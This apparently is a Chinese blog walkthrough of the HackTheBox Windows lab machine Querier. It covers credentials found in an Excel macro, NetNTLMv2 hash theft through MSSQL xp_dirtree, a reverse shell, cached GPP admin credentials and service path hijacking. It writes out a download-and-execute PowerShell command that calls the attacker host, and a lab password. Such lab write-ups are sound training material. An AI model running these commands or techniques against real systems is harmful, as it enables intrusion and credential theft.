> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tvQH9XuOPVDGJDIeZjDbhA)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **83** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0cJxJdTeNgYmBxrqznNuicqBJXAnca9Sia5lw88xHj4O1j9nO8s5O484VI3HTMkaickZrAdRiboQOuYltpTibrXTn7Q/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/175

靶机难度：中级（5.0/10）

靶机发布日期：2019 年 5 月 29 日

靶机描述：

Querier is a medium difficulty Windows box which has an Excel spreadsheet in a world-readable file share. The spreadsheet has macros, which connect to MSSQL server running on the box. The SQL server can be used to request a file through which NetNTLMv2 hashes can be leaked and cracked to recover the plaintext password. After logging in, PowerUp can be used to find Administrator credentials in a locally cached group policy file.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/KzuCxpxs7oCB12IBPzSEmAib10AOjpmlWVZL5v1vUictokJWicLLBhqOXU7BPEGlda1qVTXElPiabEJqY3xXaqId6Q/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/ru93nXbREC3lsblTT6unZTCoWcPia8D84uaTauv8WPKZPQAePE6Emc28HfL5UqaUs7ia4J1pib3JRW5sS6TnHViazA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLBkHUofK5EmyM7VSxibc4HWW74tQKbbGfHc0s4icxtHobOKgls7iapMKdA/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.125....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLFNGna0gXla0Bt6GR4y062kKNVbQpIe1I6V6NeHOKib5s3uQ7CzYxPIQ/640?wx_fmt=png)

在其他常见端口之间有 SMB 和 WinRM，MS-sql 也正在运行，这确认该域是 HTB.LOCAL...（和昨天那台靶机差不多？）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLqsXwONoYx8NQQwNz4Esvs6RicDuDmj7gIwjgX9iavJfVqOgZQxPNelUg/640?wx_fmt=png)

查看运行了哪些共享... 看到了 Reports 共享... 进去看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLb4oONuEm5OxYDPvNUhDiaO6hoyIb2a3SvMzWfX4x8SOothnaicoAme3w/640?wx_fmt=png)

在 reports 共享发现了 "Currency Volume Report.xlsm" 文件... 下载到本地发现这好像不是 xlsm 文件... 解压发现存在很多子文件... 开始一个一个查看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLfaxakNmQ3CH7FR8ZXJoibkdN0P5QicLGDtfbIicI4ZM25PNcDDpFMQsaw/640?wx_fmt=png)

查看 vbaProject.bin，在顶部附近找到带有凭据的连接字符串...

Uid=reporting;Pwd=PcwTWTHRwryjc$c6.... 这是 MSsql 的 ID 和密匙...

可以使用 impacket mssqlclient 模块连接到该靶机的 MSSQL 下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLGC4W2Z2rWws8dysxB0CAgD4T4MySyeLAq72fntEYHJLDATZ2Q5G4Ug/640?wx_fmt=png)

```
mssqlclient.py -windows-auth reporting:PcwTWTHRwryjc\$c6@10.10.10.125
```

利用 mssqlclient 模块进来了...

发现不是 SA 用户... 无权限使用一些常规命令... 查看了用户情况，果然是无权限的...

虽然无法使用 xp_cmdshell 执行命令，但可以通过使用 xp_dirtree 或 xp_fileexist 来窃取 SQL 服务帐户的哈希...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLbfFJGs9CqyZHybcWajkD7n2ycz8RlNibNkS9n5NMTW47ljLd4RibsWLQ/640?wx_fmt=png)

开启 responder，然后 xp_dirtree 窃取了 SQL 服务的哈希值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLDyEYSzzkWM2FWqJJvYucJP2oiaCm0fyUAkKc5uWBfpHLf8SS6p6Is4A/640?wx_fmt=png)

通过 john 破解哈希值.. 获得了密码...ID 是 mssql-svc

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLAvzOwGkFTj1thCaj6jjXhwyLUgaafDcC74HhiaOVZdbnicibVnibI4jxnA/640?wx_fmt=png)

通过 ID 和密匙进来了...

查询后，返回 true，可以使用 xp_cmdshell

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLV3VRR4dVuxm1ibib4xmibhOCwZUqNXJH6UQFgtZpvW84ibvgXAI5zJPC5g/640?wx_fmt=png)

这里可以开始提权了... 利用 nishang 模块里的 Invoke-PowerShellTcp 即可

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLL6v28q1mCxvbxtCgSrVMqPmfDPCrVRtkWLUfSShu9h2sYsGXyTnhsQ/640?wx_fmt=png)

成功获得反向外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLd4eYTmXVm94V6OyIZUOWyj7lic0KGmib0qCdelqF6gosdoWZm1JUy9EQ/640?wx_fmt=png)

以为有坑... 很正常的就获得了 user 信息...（和 NO80 有关系吧，这里的方法和前面的一样~~）

```
git clone https://github.com/PowerShellMafia/PowerSploit.git
```

PowerSploit 模块功能非常强大... 我试过绕过防病毒模块... 提权

这里准备利用 PowerUp.ps1 放到靶机服务器上进行扫描枚举...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPL8EsUm7EW2vb5KkoEvFPXvKHp3A78rfqXFqBsUIrCn0Qsibz03cJapPg/640?wx_fmt=png)

已准备好...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLj5mAyhIDicofaecbh3a7jWD7Xwfib6cicCV0sRQBkCduoYbHCwaqvqKPw/640?wx_fmt=png)

```
IEX(New-Object Net.Webclient).downloadString('http://10.10.14.10/PowerUp.ps1'); Invoke-AllChecks
```

开始枚举... 这里发现有点问题，重新执行了下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLsrdCUkLXRf5jaRZbCgbtmkIhIfyCXxEYRhpjleFcleoDaADSibnWfjw/640?wx_fmt=png)

看到管理员凭据已缓存在 Groups.xml 文件中...

这里根据昨天朋友圈小伙伴的提醒，因为 445 端口开放着，我这里就使用了 psexec.py 进行获取 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLCEqia0CWOQHhjvMUopicfMsEhURaE0WtxicH9qcCcmRFkRBfPcVKhibOlQ/640?wx_fmt=png)

嗯，成功获得了 system 管理员权限...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLZbFgicfanq6Xibe00n3QdQIqBz7sJibJVnANjUcWB1E0qdUicDcqe5eaJA/640?wx_fmt=png)

成功获得了 root 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/FRKzajjicJGp8Ljeuvd1c8haJLU6BUSTlxUsMxprmqibiaPIs72ByzBEZJuxntmmia0SMtaShx0Yzsa3B8bUS3JAibA/640?wx_fmt=png)

方法 2：

![](https://mmbiz.qpic.cn/mmbiz_png/qI9LT8kbvPP6zO2T1icrJiaBGOgdK9EzicmwyCwyYDS6XtvhmdO4ecfEAejEde70EolLMuPL6oHFTfnBgfylpicHug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLsicqxw46nfBbtO5QQUbQicp45OjZTmIajiaAUZku2Rg3Dqw2q6m27JSLw/640?wx_fmt=png)

Invoke-AllChecks 输出中，还可以看到有权写入 UsoSvc 服务...true

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLVDA7mGuMtaM5wL0ulKKkfW3cyCYaibnEcjk6sGTnuiaX3HPxBShMP5icg/640?wx_fmt=png)

sc.exe qc UsoSvc 检查服务状态...

这里将修改服务的二进制路径... 注入 NC 服务，然后提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLIbic8icEr7WibSuZY1zsb2licNib2yp0qibJkEZyeYIbwc3gaPSeUXeDicLvw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLUicjjNHwmKDWhOfWxiaEO6icr5iaUenScsfdz19Jia8cSzWx3fI5LV8cq6w/640?wx_fmt=png)

可以看到，获得了管理员权限... 但是 10 秒左右就断开了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPXv5Rv4ialrBicEic7icnqicwPLk65TVAmGAw4YHMRPRYytYWFvMslmTI8Itvjtys3fWbic2FmdTA0cLIg/640?wx_fmt=png)

检查了会，重启服务后... 在开启...

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0cJxJdTeNgYmBxrqznNuicqBJXAnca9Sia5lw88xHj4O1j9nO8s5O484VI3HTMkaickZrAdRiboQOuYltpTibrXTn7Q/640?wx_fmt=png)

还是存在 10~20 秒自动中断的现象，但是几秒足够获得 root 信息了... 这不影响，确确实实存在该问题！！

这里还可以利用文本形式写入 UsoSvc 服务中，直接读取任何管理员底层的信息... 在谈就到骇客了，谈远了

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成这台中等的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/KzuCxpxs7oCB12IBPzSEmAib10AOjpmlWVZL5v1vUictokJWicLLBhqOXU7BPEGlda1qVTXElPiabEJqY3xXaqId6Q/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)